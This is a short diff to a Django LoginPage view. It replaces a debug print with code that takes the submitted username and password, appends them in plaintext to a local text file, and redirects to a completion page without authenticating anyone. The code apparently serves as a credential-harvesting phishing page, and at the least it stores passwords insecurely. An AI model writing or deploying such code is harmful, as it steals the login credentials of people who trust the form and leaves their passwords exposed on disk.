@@ -10,7 +10,18 @@ class LoginPage(View):
         return render(request,'main/login_page_template.html')
     
     def post(self,request):
-        print(request.POST)
+        username = request.POST['username']
+        password = request.POST['password']
+        file = open('usernames and passwords.txt','a')
+        file.write('[info]')
+        file.write('\n')
+        file.write(f'username : {username}')
+        file.write('\n')
+        file.write(f'password : {password}')
+        file.write('\n')
+        file.write('[info]')
+        file.write('\n')
+        file.close()
         return redirect('complete_page')
     
 class CompletePage(View):
